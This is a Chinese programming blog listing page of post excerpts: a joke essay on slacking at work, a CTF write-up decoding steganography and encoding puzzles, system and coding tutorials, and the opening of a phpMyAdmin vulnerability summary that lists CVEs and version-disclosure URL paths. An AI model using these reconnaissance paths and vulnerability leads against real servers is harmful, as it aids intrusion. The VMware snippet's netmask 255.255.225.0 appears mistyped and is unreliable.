每一个初级工程师在不断累积经验不断利用上班时间提高自己摸鱼技术的累积中都会从初级摸鱼工程师进步到中级摸鱼工程师。但是不是每一个人都有机会成为高级摸鱼工程师。到了高级摸鱼工程师他们已经不被空间所限制，在家在公司在外面对我来说都是一个样。我上班去吃饭不是摸鱼，是从一个工作地点到了另一个工作地点。他们的内心没有愧疚。他们不再局限于摸鱼方法的单一，对他们来说即使是在工位上发呆还是出去洗脚本质上都是一样的事情。正如伟大的马克思所说的：“我摸鱼从来都没有感受过快乐，我只是爽”。这时一百年如一日。时间已经没有了意义。再也没有上班时间和下班时间这一说。无论什么时候都是下班时间。
对于高级摸鱼工程师来说，他们看透了摸鱼的本质。摸鱼摸走的不仅是公司的利益，还摸走了同事的精力，所以每一位高级摸鱼工程师都会劝导同事好好工作，因为只有一个努力奋斗的同事才能为自己分担工作压力。到了这个境界以后，摸鱼就变成了一个人的战斗，你讲孤独一人，在提倡狼性的公司中当一个最后的摸鱼人。这时的他们看到初级摸鱼工程师摸鱼会制止，看到同事疲惫不堪会鼓励。因为只有这样自己才能什么都不干，才能当一个彻头彻尾的闲杂人等。
还是那句老话，无产阶级必将战胜万恶的资本家。
其实我小的时候就发现了自己的天赋，在写作文上别人绞尽脑汁凑出来的八百字对于我来说只是一刹那，我可以洋洋洒洒随手写出几千字，还句式工整。这主要取决于我写文章不动脑子。他们就好像凭空生成的一样，他们本身就在我的脑海里，我只是一个打字员把他们打出来一样。
我之前入职公司的时候，我简历上会写我说我是一个前端博客主，自己的博客到现在文章浏览量已经过十万了。但是我从来没敢告诉别人我的个人账号。我怕人家面试官会找到。完了连忙握住我的双手：“你好霓虹老师我是您的粉丝，您上班写的摸鱼文章我每一篇都看，您是来面试的吧，您快滚蛋吧天天上班啥也不干就知道下楼吃饭。”
作为一名前端工程师，你一定要有一个自己的朋友圈，产品-&gt;前端-&gt;后端-&gt;测试。你要找到跟你志同道合的三个兄弟。你自己摸摸到一定程度确实会无聊的。但是即使无聊也不想工作，因为一个人的想象力是有限的。除非你像我一样脑瘫我天天啥都不干我坐那我就乐，我旁边工位的同事有段时间坚定地认为我中邪了。一个人的灵感是有限的，两个人的创意是无穷的。你和同事聊天不要动脑子。这里应该和你探讨一下与人交流的艺术。
我一直觉得，和朋友交流，不能带脑子。一定要返璞归真，回归最原始的交流方式。“阿巴阿巴阿巴。”只有这种交流方式才能认清彼此。尽量多说无意义的废话，少说有用的话。就比如说以下对话。
“你吃饭了么？”
“没吃呢”
“一会吃啥啊”
“啥都行”
“那咱俩一会一起吃饭吧”
“吃啥都行”
“那咱俩一会一起吃饭吧”
“吃啥都行”
“你吃饭了么？”
就这种废话一定要不断重复，虽然在老板眼里你和你同事可能只是两个满脑子只有饭的饭桶，但是时间就埋藏在这无意义的对话。生活很多事情都是无意义的，这就要说起萨特的虚无主义。
话扯远了。你要知道，摸鱼是人类的本质需求。但是这是勇敢者的游戏，和你职业相同的同事你不能找他一起摸，这样就没有人干活了。你只能找你的后端摸，同时你一个前端和后端聊天在旁人看来再正常不过，这就为摸鱼带来了合理性。产品前端后端测试。这就形成了一条摸鱼链。
之前新出了一部电影叫我不是鱼神不知道大家有没有看过
里面有一段经典台词。
我工作了三年，规模小的小公司我摸了三年，公司摸倒闭了，项目经理让我摸跑路了。
现在好不容易有了大公司，你非说大公司不利于发展，大家都是螺丝钉。那利不利于发展，我们能不知道么。那大公司摸一天还白给我钱，那大公司根本不挣钱。
谁家还没个打工人，你就能保证你家一辈子不打工么？
你们把我同事抓跑了，我们都得等着开除。
我不想上班。
我想摸鱼。
行么。
一个好同事真的很重要。希望大家珍惜身边的好同事，所以说包括我大家都希望自己的同事越来越强，就好像你当时上大学你们小组要交一个设计你肯定希望你的同学比你牛逼的多。
我这个人码起来字是停不下来的，只有一种情况会让我的文字戛然而止，就是快下班了。
再见，山水有相逢。
欢迎评论区留言交流，说说你身边同事或自己是如何努力上(mo)班(yu)的~
如果喜欢这篇文章，就请分享到朋友圈吧！
往期精彩回顾 适合初学者入门人工智能的路线及资料下载机器学习及深度学习笔记等资料打印机器学习在线手册深度学习笔记专辑《统计学习方法》的代码复现专辑 AI基础下载黄海广老师《机器学习课程》视频课黄海广老师《机器学习课程》711页完整版课件 本站qq群955171419，加入微信群请扫码：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbaadbde5301f2de2bcb93273a878b94/" rel="bookmark">
			SLsec都wp
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.MISC
(1）简单的隐写
(2)海贼王里的宝藏
(3)找你妹啊！
(4）EzBase
2.CRYPTO
(1)四凯撒还四栅栏？
(2)动听音符
(3)小兔子
(4)RSA
3.WEB
(1)签到
(2)EZphp
(3)1zMD5
4.REVERSE
(1)re签到
1.简单的隐写： 看到是图片，又看到是隐写用010
看提交格式是SLsec点击搜素建得出
可以看出SLsec{e2e0061f251355de79777499528d6d75}
2.海贼王里的宝藏 看提示用的是png的高和宽还得用010
（固定）八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头（固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13（固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH） 看出图片显示不全更改高10进制换16进制 更改为438高和宽一样在回去看图片
得出答案SLsec{@you_are_mine!}
3.找你妹啊！ 公正公正公正友善公正公正民主公正法治法治诚信民主平等自由公正爱国公正敬业和谐平等平等友善敬业公正诚信自由和谐富强法治自由平等友善敬业法治自由法治文明法治平等公正平等文明民主文明民主文明民主法治友善法治 得出flag{Thi5_n0t_true!!!}发现是假的 又打开图片点开属性说
放入010中搜索flag得出
得出flag{you_are_lucky_d0g} 4.EzBase 看提示显示的是ctf常见编码搜索发现是
url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是'20'，那么urlencode编码结果是:%20。
url编码
用这个网站
在线工具 - Bugku CTFhttps://ctf.bugku.com/toolsCTF在线工具-CTF工具|CTF编码|CTF密码学|CTF加解密|程序员工具|在线编解码 (hiencode.com)http://www.hiencode.com/
-.-/--/-.--/..../---/--/-.././-./--../..../..../../...-/-.-/-..-/..../..-./-.-/./..---/...--/.-.././--./-.../.---/./../.--/-/.../.---/...../-../..-/..-/...../.../..---/../...-/.../..-./--.-/...-/.---/.-./.././..---/--././...--/-.-/---/---/...../.---/./--/.--/.---/.-./--/.---/.--/.--/.--/-./-.-/.-./-.-/--../.---/..-./--/..-/-/.-../-.-/..-./....-/..-./../.-./.../-.-/../...../.-./-../.-/--/-.-/-/--/.---/.--/.--/--.-/.--/-/-.-./-.-/...../.-../-../.-/...-/...--/---/--/.-./..---/...-/--/...-/...--/..-/.---/..-./.-./-.././.../.../.-./-.-/..-/--.././--/--/..---/.--./.---/-.../.-../..-./../-.--/--../.-./-./.-./-.-/..-./-.-./...-/-/--.-/-./...../.-../..-./--.-/--../-../.../--/-./-.-./-/-.-./..-/.../.../--./..-./.--/--./.--/-.--/--../--.-/--./.-/--../.--/./--/-.-/.---/--./-.../-.-/...-/--.-/-/.../--../-.-/../-.--/-..-/.-/.--/-.-./.--/-./.-./...-/-..-/.../--../-.../.-./../../-.--/...-/./...--/-.-/-.-/---/...-/...././--.-/--../-../...-/-.-/...-/.-../-..-/.-/-./-.-./.--/-./.-./.-.././--/--../.-../-./.---/--../../.--/./--/..---/-.-./---/...-/-./..../..-/.../.../-..-/-.-/.-./.--/..-./--/.../-.-/..---/-./...-/-../..-./-.-./-.--/.../...-/--./...-/-.--/--./-.-./..---/--../--.-/..../..-/-...-/-...-/-...-/-...-/-...-/-...- 发现是摩斯密码摩斯电码转换_摩斯密码翻译器-在线工具 (all-tool.cn)
得出
KMYHOMDENZHHIVKXHFKE23LEGBJEIWTSJ5DUU5S2IVSFQVJRIE2GE3KOO5JEMWJRMJWWWNKRKZJFMUTLKF4FIRSKI5RDAMKTMJWWQWTCK5LDAV3OMR2VMV3UJFRDESSRKUZEMM2PJBLFIYZRNRKFCVTQN5LFQZDSMNCTCUSSGFWGWYZQGAZWEMKJGBKVQTSZKIYXAWCWNRVXSZBRIIYVE3KKOVHEQZDVKVLXANCWNRLEMZLNJZIWEM2COVNHUSSXKRWFMSK2NVDFCYSVGVYGC2ZQHU====== 由题目得出baes家族
先base32解密得出
S0w0dnNtUW9TMmd0RDZrOGJvZEdXU1A4bmNwRFY1bmk5QVRVRkQxTFJGb01SbmhZbWV0WnduVWtIb2JQU2F3OHVTc1lTQVpoVXdrcE1RR1lkc003b1I0UXNYR1pXVlkyd1B1RmJuNHduUWp4VlVFemNQb3BuZzJWTlVIZmFQbU5pak0= 再用base64解密得出
KL4vsmQoS2gtD6k8bodGWSP8ncpDV5ni9ATUFD1LRFoMRnhYmetZwnUkHobPSaw8uSsYSAZhUwkpMQGYdsM7oR4QsXGZWVY2wPuFbn4wnQjxVUEzcPopng2VNUHfaPmNijM 发现base64 base32 base16 都解不下去用其他base一个一个式用base58解出
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbaadbde5301f2de2bcb93273a878b94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e196a2486036e50eebd7055d264ba70c/" rel="bookmark">
			解决mobaXterm报错：因网络断开连接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决mobaXterm报错：
1：
2：
3：
参考文章：https://blog.csdn.net/qq_35037684/article/details/112546068
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0162986c52538352c2054964a67f3fc/" rel="bookmark">
			Charles联动Burp-新世界的大门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Charles联动Burp-新世界的大门 https://www.freebuf.com/articles/web/290142.htm
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07ea0cf5ddd22ffe1cfdfef992123fbc/" rel="bookmark">
			JAVA定义一个返回值类型为泛型的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 表示本方法持有一个不确定类型T，表示本方法是一个泛型方法T 返回值类型为T类型的对象Class clazz:只有通过反射才能拿到泛型T的对象，因为方法运行时才知道泛型的真正类型throws IllegalAccessException, InstantiationException：newInstance()方法抛出了异常 /* * &lt;T&gt;表示本方法持有一个不确定类型T，表示本方法是一个泛型方法 * T 返回值类型为T类型的对象 * Class&lt;T&gt; clazz:只有通过反射才能拿到泛型T的对象，因为方法运行时才知道泛型的真正类型 * throws IllegalAccessException, InstantiationException：newInstance()方法抛出了异常 * */ public class Demo { public &lt;T&gt; T method(Class&lt;T&gt; clazz) throws IllegalAccessException, InstantiationException { T t = clazz.newInstance(); return t; } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec0a4e19983dbd440b5d8c499e8dd9f6/" rel="bookmark">
			VMWare虚拟机网络配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Bridged（桥接模式） 桥接模式相当于虚拟机和主机在同一个真实网段，VMWare充当一个集线器功能（一根网线连到主机相连的路由器上），所以如果电脑换了内网，静态分配的ip要更改。图如下：
NAT（网络地址转换模式） NAT模式和桥接模式一样可以上网，只不过，虚拟机会虚拟出一个内网，主机和虚拟机都在这个虚拟的局域网中。NAT中VMWare相当于交换机（产生一个局域网，在这个局域网中分别给主机和虚拟机分配ip地址）
步骤：
1.设置VMVare的默认网关（相当于我们设置路由器）: 编辑-&gt;虚拟网络编辑器-&gt;更改设置-&gt;选中VM8&gt;点击NAT设置，设置默认网关为192.168.182.2。
2.设置主机ip地址，点击VMnet8，设置ip地址为192.168.182.1，网关为上面设置的网关。
3.设置linux虚拟机上的网络配置，界面化同上。
IP配置 未安装系统
已安装系统
ifcfg-ens33原文件如下，此时为NAT模式下的DHCP
改为静态IP：
如果是NAT要去虚拟网络编辑器中查看NAT设置中的网关IP
cd /etc/sysconfig/network-scripts/ //进入到网络适配器文件夹中 mv ifcfg-ethXXX ifcfg-eth0 //名字改为ifcfg-eth0 vi ifcfg-eth0 //编辑文件 TYPE=Ethernet DEFROUTE=yes PEERDNS=yes PEERROUTES=yes IPV4_FAILURE_FATAL=no IPV6INIT=yes IPV6_AUTOCONF=yes IPV6_DEFROUTE=yes IPV6_PEERDNS=yes IPV6_PEERROUTES=yes IPV6_FAILURE_FATAL=no NAME=eth0 #UUID（Universally Unique Identifier）是系统层面的全局唯一标识符号，Mac地址以及IP地址是网络层面的标识号； #两台不同的Linux系统拥有相同的UUID并不影响系统的使用以及系统之间的通信； #可以通过命令uuidgen ens33生成新的uuid #和DEVICE一样也可以不写,DEVICE="ens33"可以不写，但一定不要写DEVICE="eth0" UUID=ae0965e7-22b9-45aa-8ec9-3f0a20a85d11 ONBOOT=yes #开启自动启用网络连接,这个一定要改 IPADDR=192.168.182.3 #设置IP地址 NETMASK=255.255.225.0 #设置子网掩码 GATEWAY=192.168.182.2 #设置网关 DNS1=61.147.37.1 #设置主DNS DNS2=8.8.8.8 #设置备DNS BOOTPROTO=static #启用静态IP地址 ,默认为dhcp :wq! #保存退出 service network restart #重启网络，本文环境为centos7 ping www.baidu.com #测试网络是否正常 ip addr #查看IP地址 改BOOTPROTO和NAME，新增IP网关DNS等配置
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec0a4e19983dbd440b5d8c499e8dd9f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d465c3acf1c80260aca82951f2b7f00/" rel="bookmark">
			获取今日，本周、本月、本年 第一天
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、获取今日零点
format(Date.parse(new Date()), "yyyy-MM-dd") + "T" + "00:00:00" + ".129Z"; 2、获取本周第一天
getFirstDayOfWeek(date) { var weekday = date.getDay() || 7; //获取星期几,getDay()返回值是 0（周日） 到 6（周六） 之间的一个整数。0||7为7，即weekday的值为1-7 date.setDate(date.getDate() - weekday + 1); //往前算（weekday-1）天，年份、月份会自动变化 return format(Date.parse(date), "yyyy-MM-dd")+"T"+ "00:00:00" + ".129Z"; }, //调用 startTime = this.getFirstDayOfWeek(new Date()) 3、获取本月第一天
startTime = format(Date.parse(new Date()), "yyyy-MM") + "-01" + "T" + "00:00:00" + ".129Z"; 4、获取本年第一天
startTime = format(Date.parse(new Date()), "yyyy") + "-01-01" + "T" + "00:00:00" + "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7d465c3acf1c80260aca82951f2b7f00/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07c3584b1d91ea5bcbc46758daa709a4/" rel="bookmark">
			计算除法java实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		class Solution { public double[] calcEquation(List&lt;List&lt;String&gt;&gt; equations, double[] values, List&lt;List&lt;String&gt;&gt; queries) { //这一题可以将我们的除法计算过程抽象成一个图来做运算，每一个除数与被除数抽象成图的一个节点，而除数和被除数的关系抽象成图的边，至于商则是除数上的一个属性，我们运用宇哥Map&lt;String,Map&lt;String,Double&gt;&gt;这样一个结构来存储每一个节点第一个key代表着被除数，第二个key代表除数，Double则代表着这个除法关系的商 //首先我们需要将equation和values转化成一张使用如上关系表示的图结构 Map&lt;String,Map&lt;String,Double&gt;&gt; graph = createGraph(equations,values); double[] result = new double[queries.size()]; //对于每一个需要计算的queries表示的是图结构上一条路劲的乘积，所以我们遍历queries计算对图进行一个深度优先搜索计算出结果 for(int i = 0;i &lt; queries.size();i++){ String from = queries.get(i).get(0); String to = queries.get(i).get(1); if(!graph.containsKey(from) || !graph.containsKey(to)){ result[i] = -1.0; }else{ Set&lt;String&gt; visited = new HashSet&lt;&gt;(); result[i] = dfs(graph,from,to,visited); } } return result; } //构建图 private Map&lt;String,Map&lt;String,Double&gt;&gt; createGraph(List&lt;List&lt;String&gt;&gt; equations, double[] values){ Map&lt;String,Map&lt;String,Double&gt;&gt; graph = new HashMap&lt;&gt;(); //遍历equtions对其中的每一个除法关系构建一个节点，并且创建节点的关系，相应的需要构建一条被除数到除数的除法关系的边 for(int i = 0;i &lt; equations.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07c3584b1d91ea5bcbc46758daa709a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75b7cb0c5d6383addf2d8f304f1a9fa1/" rel="bookmark">
			在C语言中if选择语句条件这样写(0 ＜ x ＜ 10) 正确吗?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 写在前面:
刚开始学习C语言的时候,好多同学在写if条件语句时都会出现类似的问题.但是有的时候却不影响程序的正确运行,有时候却会与我们所料想的结果不一致,这究竟是什么原因呢?下面我们就一起探究探究吧.
一.巧合正确的例子 二.正好错误的例子 三. 以上两种情况究竟是什么原因呢?又该如何去写呢? 其实0 &lt; x &lt; 5这样的写法并没有错误,但是无意义.因为&lt;的运算符顺序是从左至右,所以0 &lt; x &lt; 5被理解为(0 &lt; x) &lt; 5.那么首先x先和0进行比较,如果0&lt;x成立则结果为1,否则结果为0.因此不管0&lt;x是否成立,0或1都小于5,整式的结果都为真.
正确的写法:
当需要表示一个区间范围时可以使用逻辑与(&amp;&amp;)或逻辑或(||)进行串联. 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5e9caf8413e5591a86207f16b0abadf/" rel="bookmark">
			注入：ByName和ByType(重点)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring的set注入中，autowire的选值有五种，比较常用的是byType属性和byName属性。下面我们通过一个简单的项目来对他们进行大致说明。
autowire=byName,顾名思义，它是依靠名称来对bean里面的内容来将“依赖对象”和“被依赖对象”进行联系。（也就是我们常说的引用）
下面我们通过工程来说明。
本次以来我们采用四个不同依赖注入呈环状来说明：
byType注入分别为：同类注入，继承类注入，接口注入
我们根据需求，创建下面的类和接口：
下面我们用下图的思想来表现他们之间的关系
1、Menu是接口,而MemuIpl是Menu的实现类。
2、Perm与Permission是继承关系，Perm为父类，Permission是子类。
3、MenuImpl、Permission、Role、Person是依赖关系的被注入对象（可以理解为我们项目中需要导的包）。
下面：我们来对所需的类进行创建
Menu
package cn.kgc.entity; public interface Menu { public void delet(); } MenuImpl
package cn.kgc.entity; public class MenuImpl implements Menu{ private Integer id; private String memuName; private Person person; @Override public void delet() { System.out.println("接口实现方法"); } } Perm
package cn.kgc.entity; public class Perm{ private Integer id; private String pname; private Menu menu; } Permission
package cn.kgc.entity; public class Permission extends Perm{ public void add(){ System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5e9caf8413e5591a86207f16b0abadf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab9145ed67dd161b106fe57915e0991b/" rel="bookmark">
			C语言之函数调用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C语言之函数调用 “温故而知新，可以为师矣”！
让我们开启函数的道路吧！
今天主要讲函数的调用方式！
在讲之前，先回顾一下实际参数和形式参数的区别；
1.在定义函数时函数名后面括号中的变量名称为“形式参数”（简称‘形参’）；
int function（int x,int y）// x,y为形参 { int sum; sum=x +y; return sum; } 2.在主调函数中调用一个函数时，函数名后面的括号中的参数为“实际参数”（简称‘实参’）；
void main（） { int a=1,b=2; function(a,b); //a,b为实参 } 废话不多说，让我们开始今天的正题吧！
函数调用分为两种，传值调用和引用调用！！
传值调用
所谓的传值调用，就是把参数的实际值复制给函数的形式参数，这样子修改函数内的形参不会影响到实参。让我们通过例子来体会吧。 include&lt;stdio.h&gt; int sum(int x,int y); //函数的声明 int main() { int a=2,b=3; printf("%d\t %d\t %d\t",sum(a,b),a,b);//将a,b的值传给sum函数，并且输出sum(a,b),a,b的值 return 0; } int sum( int x,int y) //函数的定义 { int n; n=x; x=y; y=x; //交换x,y的值进行交换 return x+y; } 从结果中我们可以看出，传值调用不会影响实参的值
2. 引用调用
引用调用，就是让形参为指向实参地址的指针，所以对形参的指向操作时，就相当于对实参进行操作。让我们通过例子来体会吧！！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab9145ed67dd161b106fe57915e0991b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f820676c9f65a4bba1ff17f317abed65/" rel="bookmark">
			Canal在SpringBoot项目的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Canal介绍 1、应用场景 Canal是一个很好的数据库同步工具。Canal是阿里巴巴旗下的一款开源项目，纯java开发。基于数据库增量日志解析，提供增量数据订阅&amp;消费，目前主要支持了MySQL（源端），目标端支持各种中间价及数据库。
2、工作原理 Canal的工作原理就是把自己伪装成MySQL slave，模拟MySQL slave的交互协议向MySQL Mater发送 dump协议，MySQL mater收到canal发送过来的dump请求，开始推送binary log给Canal，然后Canal解析binary log，再发送到存储目的地，比如MySQL，Kafka，Elastic Search等等。
注意：canal的数据同步不是全量的，而是增量的
3、Canal环境搭建 canal的原理是基于mysql binlog技术，所以这里一定需要开启mysql的binlog写入功能。
开启mysql服务： service mysql start
（1）检查binlog功能是否有开启
mysql&gt; show variables like 'log_bin'; +---------------+-------+ | Variable_name | Value | +---------------+-------+ | log_bin | OFF | +---------------+-------+ 7 1 row in set (0.00 sec) （2）如果显示状态为OFF表示该功能未开启，开启binlog功能
① 修改 mysql 的配置文件 my.cnf
vi /etc/my.cnf
追加内容：
log-bin=mysql-bin #binlog文件名
binlog_format=ROW #选择row模式
server_id=1 #mysql实例id,不能和canal的slaveId重复
② 重启 mysql：
service mysql restart
（3）登录 mysql 客户端，查看 log_bin 变量
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f820676c9f65a4bba1ff17f317abed65/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88c2a28e6f9a8973b6d4358c9fceda3a/" rel="bookmark">
			python基础学习day1-图形化程序设计 turtle模块应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python基础学习day1-图形化程序设计 使用turtle模块进行简单图像绘制
1、奥运五环
在Anaconda环境下使用pycharm,编辑turtle命令会出现效果图一闪而过的情况，加上 turtle.done() 会消除这种现象。
奥运五环效果图：
2、使用海龟绘图turtle，输出四个矩形
这里我选择用坐标移动的方式画出四个位置的矩形，也可以采用改变箭头位置的方式画出图型。
四个矩形的效果图：
学习python的第一天，加油！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96adadd43e5aea4c2f6bd459b451f666/" rel="bookmark">
			【Pycharm】import自定义包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述 使用pycharm时通常需要跨py文件调用，此时我们需要import自定义的包。
我们以下图所示的情况为例：我们在test.py中希望import utils这个包
首先我们用下面这行代码尝试import，但是发现不可行
import lab0.utils as p1 此时报错：ModuleNotFoundError: No module named 'lab0'
下面介绍三种方法导入自定义包 方法1：适用于import同目录下的包 import utils as p1	去掉父目录lab0，直接import utils
如果一直在同目录下import包的话，这种方式还是比较省事的。
方法2：适用于import相同/不同目录下的包 import lab.lab0.utils as p1 在原来的导入项前加上了lab0的上级目录。
这种方法的好处在于Pycharm不会编译时下划线警告了，而且打出utils.时还会自动提示utils中的类和函数。
方法3：添加父目录到Python的搜索目录模块的路径集中 import sys sys.path.append("..") import lab0.utils as p1 通过这种方式，python程序会在上一级查找相应的其他python包或者文件。
这种方法没改变原来我们的想法：import 上级目录名.包名 ，而且最开始sys.append了之后对于上级目录下的其它包可以一劳永逸。
参考链接 python脚本中的sys.path.append("…")详解
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b060e64f37d148a44037142a5cfbeff6/" rel="bookmark">
			python判断元素在列表中的索引位置的代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		把开发过程比较重要的代码段备份一下，如下代码段是关于python判断元素在列表中的索引位置的代码，希望能对大伙也有用途。
list = [“red”,“green”,“blue”]
assert list.index(“red”) == 0
assert list.index(“blue”) == 2
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd9f038af8124cf528a17db49dbd909a/" rel="bookmark">
			最全phpmyadmin漏洞汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、phpMyAdmin简介
二、查看phpmyadmin版本
三、历史漏洞及poc利用
1、万能密码直接登入
2、CVE-2009-1151：远程代码执行
3、CVE-2012-5159：任意PHP代码攻击
4、CVE-2013-3238：远程PHP代码执行
5、WooYun-2016-199433：任意文件读取漏洞
6、CVE-2014 -8959：本地文件包含
7、CVE-2016-5734 ：后台命令执行RCE
8、CVE-2017-1000499 跨站请求伪造
9、CVE-2018-12613：后台文件包含
10、CVE-2018-19968：任意文件包含/RCE
11、CVE-2019-12922 跨站请求伪造
12、CVE-2020-0554：后台SQL注入
四、一些总结
五、参考链接
一、phpMyAdmin简介 phpMyAdmin 是一个用php编写的免费软件工具，旨在通过Web友好界面处理MySQL的管理。phpMyAdmin 支持对 MySQL 和 MariaDB 数据库的广泛操作。经常使用的操作（有如管理数据库、表、列、关系、索引、用户、权限等）可以通过用户界面执行，当然您也可以直接执行任何 SQL 语句。
从1998年发布第一版，到目前发布的最新版为5.1.1，全部历史版本说明：
phpMyAdmin 5.2未来版本与PHP7.2及更高版本和MySQL/MariaDB 5.5及更高版本兼容。 phpMyAdmin 5.1.1当前版本与PHP7.1及更新版本和MySQL/MariaDB 5.5及更新版本兼容。 phpMyAdmin 5.0.0与PHP 7.1及更新版本和MySQL/MariaDB 5.5及更新版本兼容的旧版本。一直支持到2021年2月24日。 phpMyAdmin 4.9.7旧版本，兼容PHP5.5至7.4和MySQL/MariaDB 5.5及更新版本。当前仅支持安全修复程序。 phpMyAdmin4.9.0当前版本与PHP5.5至7.3和MySQL 5.5及更新版本兼容。 phpMyAdmin4.8.0 phpMyAdmin4.6.0-4.7.0旧版本，兼容PHP5.5至7.1和MySQL 5.5及更新版本。支持期至2017年4月1日。 phpMyAdmin4.4.0旧版本，与PHP5.3.7至7.0和MySQL 5.5兼容。一直支持到2016年10月1日。 phpMyAdmin4.1.0-4.3.0旧版本，与PHP5.3和MySQL 5.5兼容。一直支持到2015年10月1日。 phpMyAdmin4.0.0旧版本，与PHP5.2和MySQL 5兼容。不支持PHP 5.5或更新版本。支持期至2017年4月1日。 二、查看phpmyadmin版本 直接在phpmyadmin的url后加下面文件路径爆出：
/readme /changelog /Change /changelog.php /Documetation.html /Documetation.txt /translators.html /doc/html/index.html 三、历史漏洞及poc利用 1、万能密码直接登入 ​弱口令：版本phpmyadmin2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd9f038af8124cf528a17db49dbd909a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7cf028783d3046af5594d60452dc40f/" rel="bookmark">
			【Redis过期策略/内存淘汰机制/对过期Key的处理】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我是🌟廖志伟🌟，一名🌕Java开发工程师🌕、📝Java领域优质创作者📝、🎉CSDN博客专家🎉、🌹幕后大佬社区创始人🌹。拥有多年一线研发经验，研究过各种常见框架及中间件的底层源码，对于大型分布式、微服务、三高架构（高性能、高并发、高可用）有过实践架构经验。
🍊博主：java_wxid
🍊博主：Java廖志伟
🍊社区：幕后大佬
文章目录 Redis过期策略惰性删除流程定期删除流程 内存淘汰机制RDB对过期key的处理AOF对过期key的处理 本文内容： Redis过期策略 Redis采用的过期策略
惰性删除+定期删除
惰性删除流程 在进行get或setnx等操作时，先检查key是否过期，若过期，删除key，然后执行相应操作；若没过期，直接执行相应操作
定期删除流程 对指定个数个库的每一个库随机删除小于等于指定个数个过期key，遍历每个数据库（就是redis.conf中配置的"database"数量，默认为16），检查当前库中的指定个数个key（默认是每个库检查20个key，注意相当于该循环执行20次，循环体时下边的描述），如果当前库中没有一个key设置了过期时间，直接执行下一个库的遍历，随机获取一个设置了过期时间的key，检查该key是否过期，如果过期，删除key，判断定期删除操作是否已经达到指定时长，若已经达到，直接退出定期删除。
问题：定期删除漏掉了很多过期 key，然后你也没及时去查，也就没走惰性删除，此时会怎么样？如果大量过期 key 堆积在内存里，导致 Redis 内存块耗尽了，怎么解决呢？走内存淘汰机制
内存淘汰机制 Redis 内存淘汰机制有以下几个：
noeviction: 当内存不足以容纳新写入数据时，新写入操作会报错，这个一般没人用吧，实在是太恶心了。 allkeys-lru：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的 key（这个是最常用的）。
